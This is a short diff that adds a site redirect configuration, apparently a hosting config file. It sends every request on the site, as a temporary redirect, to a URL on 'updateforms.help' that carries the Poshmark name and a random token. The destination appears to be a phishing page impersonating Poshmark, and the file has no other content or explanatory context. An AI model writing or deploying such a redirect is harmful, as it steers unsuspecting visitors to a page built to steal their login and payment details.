@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://poshmark.updateforms.help/dcsOxMKXc",
+      "permanent": false
+    }
+  ]
+}
